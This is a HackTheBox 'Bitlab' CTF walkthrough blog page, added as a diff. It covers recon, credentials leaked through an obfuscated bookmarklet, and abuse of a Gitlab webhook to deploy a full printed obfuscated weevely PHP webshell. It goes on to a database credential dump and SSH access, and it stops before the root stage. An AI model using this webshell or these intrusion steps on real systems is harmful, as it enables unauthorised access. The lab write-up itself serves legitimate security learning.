@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Bitlab - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Bitlab box was an interesting box, user part was typical real-life scenario (actually meet this scenario during a pentest) while the root part was my first time Reverse Engineering.
+First we add the box ip to our hosts file and let&#39;s start!
+$ echo &amp;#34;10.10.10.114 bitlab.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts User flag. Let&#39;s start with the classic nmap scan:
+nmap -sV -sT -sC bitlab.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-26 02:00 CEST PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."/>
+<meta name="keywords" content="hackthebox, ctf, bitlab"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/bitlab/" />
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+<link rel="shortcut icon" href="/img/favicon.ico">
+
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Bitlab - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." />
+<meta name="twitter:description" content="Bitlab box was an interesting box, user part was typical real-life scenario (actually meet this scenario during a pentest) while the root part was my first time Reverse Engineering.
+First we add the box ip to our hosts file and let&#39;s start!
+$ echo &amp;#34;10.10.10.114 bitlab.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts User flag. Let&#39;s start with the classic nmap scan:
+nmap -sV -sT -sC bitlab.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-26 02:00 CEST PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7." />
+<meta name="twitter:site" content="/" />
+<meta name="twitter:creator" content="hg8" />
+<meta name="twitter:image" content="/img/bitlab-hackthebox.png">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Bitlab - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.">
+<meta property="og:description" content="Bitlab box was an interesting box, user part was typical real-life scenario (actually meet this scenario during a pentest) while the root part was my first time Reverse Engineering.
+First we add the box ip to our hosts file and let&#39;s start!
+$ echo &amp;#34;10.10.10.114 bitlab.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts User flag. Let&#39;s start with the classic nmap scan:
+nmap -sV -sT -sC bitlab.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-26 02:00 CEST PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7." />
+<meta property="og:url" content="/posts/bitlab/" />
+<meta property="og:site_name" content="Bitlab - HackTheBox" />
+<meta property="og:image" content="/img/bitlab-hackthebox.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2020-01-11 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    hg8&#39;s Notes
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/">Posts</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/">Posts</a></li>
+      
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/bitlab/">Bitlab - HackTheBox</a></h1>
+  <div class="post-meta">
+      
+    <span class="post-date">
+      2020-01-11
+    </span>
+    
+    
+    <span class="post-author">::
+      hg8
+    </span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
+    
+    #<a href="/tags/ctf/">ctf</a>&nbsp;
+    
+    #<a href="/tags/bitlab/">bitlab</a>&nbsp;
+    
+  </span>
+  
+
+  
+  <img src="/img/bitlab-hackthebox.png" class="post-cover" />
+  
+
+  <div class="post-content">
+    <p>Bitlab box was an interesting box, user part was typical real-life scenario (actually meet this scenario during a pentest) while the root part was my first time Reverse Engineering.</p>
+<p>First we add the box ip to our hosts file and let's start!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;10.10.10.114 bitlab.htb&#34;</span> &gt;&gt; /etc/hosts
+</code></pre></div><h1 id="user-flag">User flag.</h1>
+<p>Let's start with the classic nmap scan:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sV -sT -sC bitlab.htb
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-10-26 02:00 CEST
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp open  http    nginx
+|_ http-robots.txt: <span style="color:#ae81ff">55</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 96.45 seconds
+</code></pre></div><p>We have a classical web app running on port 443 and the ssh port 22 open.</p>
+<p>Opening <a href="http://bitlab.htb">http://bitlab.htb</a> display the following a gitlab instance :</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/67625187-25eb4000-f82a-11e9-81e9-2541d037031e.png" alt="2019-10-26-215213_1531x1034_scrot"></p>
+<p>Using <code>gobuster</code> to brute force for interesting directories and files won't be useful here since all urls return a redirect to the login page. We will do the old fashioned way of manual browsing.</p>
+<p><code>Explore</code> page is empty, while <code>Help</code> show a directory listing and a <code>bookmarks.html</code> page. Opening this page display what looks like the exported bookmarks of the developer.</p>
+<p>The <code>Gitlab - Sign In</code> bookmark looks odd:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">DT</span>&gt;&lt;<span style="color:#f92672">A</span> <span style="color:#a6e22e">HREF</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:(function(){ var _0x4b18=[&#34;</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x76</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x61</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x6C</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x75</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x65</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x75</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x73</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x65</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x72</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x5F</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x6C</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x6F</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x67</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x69</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x6E</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x67</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x65</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x74</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x45</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x6C</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x65</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x6D</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x65</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x6E</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x74</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x42</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x79</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x49</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x64</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x63</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x6C</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x61</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x76</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x65</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x75</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x73</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x65</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x72</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x5F</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x70</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x61</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x73</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x73</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x77</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x6F</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x72</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x64</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x31</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x31</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x64</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x65</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x73</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x30</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x30</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x38</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x31</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x78</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#960050;background-color:#1e0010">]</span><span style="color:#960050;background-color:#1e0010">;</span><span style="color:#a6e22e">document</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">_0x4b18</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">2</span><span style="color:#960050;background-color:#1e0010">]</span><span style="color:#960050;background-color:#1e0010">]</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">_0x4b18</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">]</span><span style="color:#960050;background-color:#1e0010">)</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">_0x4b18</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">0</span><span style="color:#960050;background-color:#1e0010">]</span><span style="color:#960050;background-color:#1e0010">]</span><span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#a6e22e">_0x4b18</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">3</span><span style="color:#960050;background-color:#1e0010">]</span><span style="color:#960050;background-color:#1e0010">;</span><span style="color:#a6e22e">document</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">_0x4b18</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">2</span><span style="color:#960050;background-color:#1e0010">]</span><span style="color:#960050;background-color:#1e0010">]</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">_0x4b18</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">4</span><span style="color:#960050;background-color:#1e0010">]</span><span style="color:#960050;background-color:#1e0010">)</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">_0x4b18</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">0</span><span style="color:#960050;background-color:#1e0010">]</span><span style="color:#960050;background-color:#1e0010">]</span><span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#a6e22e">_0x4b18</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">5</span><span style="color:#960050;background-color:#1e0010">]</span><span style="color:#960050;background-color:#1e0010">;</span> <span style="color:#960050;background-color:#1e0010">}</span><span style="color:#960050;background-color:#1e0010">)</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#960050;background-color:#1e0010">)</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#a6e22e">ADD_DATE</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1554932142&#34;</span>&gt;Gitlab Login&lt;/<span style="color:#f92672">A</span>&gt;
+</code></pre></div><p>The bookmark is not a url but javascript script. This is a useful trick that allow to run javascript on a given website just by clicking on the bookmark icon.</p>
+<p>Since the js is obfuscated let's open the Gitlab login page and run it onto the console to see what happen :</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/67625306-f6d5ce00-f82b-11e9-84b8-7a47c3ba733b.png" alt="2019-10-26-220516_1455x1348_scrot"></p>
+<p>The js script is automatically filling the login form with username <code>clave</code> and a password. While checking network we can see that the password is <code>11des0081x</code>.</p>
+<p>So we have access to one developer Gitlab account. Out of curiosity I tried to ssh with those credentials but without surprise, it didn't worked. Let's move on.</p>
+<p>We have access to two repositories :</p>
+<ul>
+<li>Deployer</li>
+<li>Profile</li>
+</ul>
+<p>Seeing by the name we can guess that <code>deployer</code> will be a kind of script to automatically deploy application to the web server. Let's try to understand the inner working better:</p>
+<p><code>deployer</code> repository hold a single <code>index.php</code> file. The README file explain that it's a webhook. Reading through the <a href="https://docs.gitlab.com/ee/user/project/integrations/webhooks.html">documentation of gitlab</a> we can understand that a webhook is a function that will call a given url when a event occur on the repository.</p>
+<p>In our case here, we can guess that the repository is configured to call <code>http://bitlab.htb/deployer/index.php</code> when a action is made on the repository (can be commit, merge, pull request, etc&hellip;). Let's take a look at the <code>index.php</code> to understand what action is made once it's called :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+
+$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;php://input&#34;</span>);
+$payload  <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($input);
+
+$repo <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">project</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
+$event <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">event_type</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
+$state <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">object_attributes</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">state</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
+$branch <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">object_attributes</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">target_branch</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
+
+<span style="color:#66d9ef">if</span> ($repo<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;Profile&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $branch<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;master&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $event<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;merge_request&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $state<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;merged&#39;</span>) {
+    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;cd ../profile/; sudo git pull&#39;</span>),<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+}
+
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</code></pre></div><p>This a rather simple script. Judging from the <code>if</code> condition we understand that the script will <code>cd</code> into <code>../profile/</code> directory and then <code>git pull</code> to get the latest changes on every merged merge request. It's our luck, because we have control over the <code>profile</code> repository which is available through the Gitlab instance with our credentials. That means that if we merge a file after a<code>merge_request</code> to the <code>profile</code> repository, this said file will automatically be pulled on the server by the <code>deployer/index.php</code> webhook. That's the perfect scenario for a webshell don't you thin? :)</p>
+<p>Through this Gitlab interface we can add a new file to our the <code>profile</code> repository, it will be faster than cloning.</p>
+<p>I used <code>weevely</code> to generate a php webshell :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python weevely.py generate htbpassword hg8.php
+Generated <span style="color:#e6db74">&#39;hg8.php&#39;</span> with password <span style="color:#e6db74">&#39;htbpassword&#39;</span> of <span style="color:#ae81ff">762</span> byte size.
+$ cat hg8.php
+&lt;?php
+$r<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$k=&#34;ab+-c7+-377b&#34;;$kh=+-&#34;3b+-25356491d+-a&#34;;$+-kf=&#34;+-be0+-0e7cb757+-b&#34;;$p=+-&#34;w0NSnMM+-i&#39;</span>;
+$A<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;+-j};}}r+-e+-tur+-n $o;}if(+-@preg_+-+-matc+-h(&#34;/$kh(+-.+)+-$kf/&#34;,@file_get_+-conten&#39;</span>;
+$Y<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;;$r+-=@ba+-se64_+-+-encod+-e(@x(@gzcompre+-ss(+-$o),$+-k));print(&#34;$p+-+-$kh$r$kf&#34;);}&#39;</span>;
+$G<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;or($i=0;$i+-&lt;$l+-;+-){fo+-r($+-j+-=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++-+-+,$+-i++){$o.=$t{$i}^$k{$&#39;</span>;
+$D<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ba+-s+-e+-64_decode($m[1+-])+-,$k+-)));$o=@ob_get_c+-+-onte+-nts();@ob_en+-d_clean()&#39;</span>;
+$l<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ONjCY+-uBR&#34;;funct+-ion x+-($t,$k+-){$c+-=+-strle+-+-n($k);$l=st+-rlen(+-$t);$o=&#34;+-&#34;;f&#39;</span>;
+$n<span style="color:#f92672">=</span>str_replace<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;A&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;AcAreAate_AfuncAtiAon&#39;</span><span style="color:#f92672">)</span>;
+$w<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ts(+-&#34;php:/+-/+-input&#34;),$+-m)==1){+-@ob_s+-tart()+-;+-@eva+-l(@gzu+-ncompress(@x+-(@&#39;</span>;
+$W<span style="color:#f92672">=</span>str_replace<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;+-&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>,$r.$l.$G.$A.$w.$D.$Y<span style="color:#f92672">)</span>;
+$u<span style="color:#f92672">=</span>$n<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;&#39;</span>,$W<span style="color:#f92672">)</span>;$u<span style="color:#f92672">(</span><span style="color:#f92672">)</span>;
+?&gt;
+</code></pre></div><p>After committing our new file to the repository we start a merge request and merge it ourselves since we have enough permissions to do so.<br>
+Our webshell is now in the <code>profile</code> repository :</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/67625567-7913c180-f82f-11e9-9a78-54c020336a58.png" alt="2019-10-26-223029_1281x515_scrot"></p>
+<p>If the webhook worked properly our new file should already be on the server, let's try it out :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python weevely.py http://bitlab.htb/profile/hg8.php htbpassword
+
+weevely&gt; id
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+www-data@bitlab:/var/www/html/profile $
+</code></pre></div><p>We are in as user <code>www-data</code>.</p>
+<h2 id="pivot-www-data---clave-user">Pivot www-data -&gt; clave user</h2>
+<p>Let's do some recon to get the user flag :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bitlab:/ $ ls -l /home
+total <span style="color:#ae81ff">4</span>
+drwxr-xr-x <span style="color:#ae81ff">4</span> clave clave <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">8</span> 14:40 clave
+www-data@bitlab:/ $ ls -l /home/clave
+total <span style="color:#ae81ff">20</span>
+-r-------- <span style="color:#ae81ff">1</span> clave clave <span style="color:#ae81ff">13824</span> Jul <span style="color:#ae81ff">30</span> 19:58 RemoteConnection.exe
+-r-------- <span style="color:#ae81ff">1</span> clave clave    <span style="color:#ae81ff">33</span> Feb <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2019</span> user.txt
+</code></pre></div><p>The user is <code>clave</code> as well. Of course we don't have enough permissions to read the flag.</p>
+<p>After a bit of recon time, it seems that nothing helpful seems to be accessible from <code>www-data</code> user. When nothing can be found, a good strategy is to look back at our entry point to make sure we didn't forgot anything. Let's go back to our starting point : Gitlab.</p>
+<p>After searching around and digging a bit more we can find a &ldquo;Snippet&rdquo; page under each users profile. On the Developer profile there is a <code>Postgresql</code> snippet with hard-coded credentials:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+$db_connection <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
+$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>($db_connection, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
+</code></pre></div><p>Let's try to dig into the database for useful informations:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bitlab:/ $ psql profiles profiles
+sh: 1: psql: not found
+</code></pre></div><p>Since <code>psql</code> is not installed, let's use the postgresql PHP library. I tweaked up the snippet a little to obtain the following scrip :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+$db_connection <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
+
+$query_result <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>($db_connection, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
+$results <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_fetch_all</span>($query_result);
+<span style="color:#a6e22e">print_r</span>($results);
+</code></pre></div><p>Running the php script output only one user, <code>clave</code> again and what looks like a <code>base64</code> encoded password:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bitlab:/tmp $ php test.php
+Array
+<span style="color:#f92672">(</span>
+    <span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; Array
+        <span style="color:#f92672">(</span>
+            <span style="color:#f92672">[</span>id<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+            <span style="color:#f92672">[</span>username<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; clave
+            <span style="color:#f92672">[</span>password<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; c3NoLXN0cjBuZy1wQHNz<span style="color:#f92672">=</span><span style="color:#f92672">=</span>
+        <span style="color:#f92672">)</span>
+
+<span style="color:#f92672">)</span>
+</code></pre></div><p>Decoding the password gives the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;c3NoLXN0cjBuZy1wQHNz==&#34;</span> | base64 -di
+ssh-str0ng-p@ss
+</code></pre></div><p>Awesome, we got the ssh password for user <code>clave</code> let's go for the user flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh clave@bitlab.htb
+clave@bitlab.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
+Permission denied, please try again.
+</code></pre></div><p><code>Permission denied</code> that's disappointing and strange. The database entry clearly state the user is <code>clave</code> (we saw previously that no other user are present on the box). The password itself state ssh&hellip; Could it be that it was simply the clear-text password&hellip;?</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh clave@bitlab.htb
+clave@bitlab.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
+Last login: Sun Oct <span style="color:#ae81ff">27</span> 14:26:51 <span style="color:#ae81ff">2019</span> from 10.10.10.10
+clave@bitlab:~$ cat user.txt
+1e3fxxxxxxxxxxxxxxxxb8154
+</code></pre></div><p>That was it, it was easy to loose time on this one but the password was <code>c3NoLXN0cjBuZy1wQHNz==</code> without decoding.</p>
+<p>Let's move to root.</p>
+<h1 id="root-flag">Root Flag</h1>
+<h2 id="recon">Recon</h2>
+<p>The recon part was quite quick, a Windows executable named <code>RemoteConnection.exe</code> was present on the home folder. Let's pull it and start the analysis:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ scp clave@bitlab.htb:~/RemoteConnection.exe .
+clave@bitlab.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
+RemoteConnection.exe                                                100%   14KB 279.5KB/s   00:00
+</code></pre></div>
+  </div>
+  
+  <div class="pagination">
+    <div class="pagination__title">
+      <span
+        class="pagination__title-h">Read other posts</span>
+      <hr />
+    </div>
+    <div class="pagination__buttons">
+      
+      
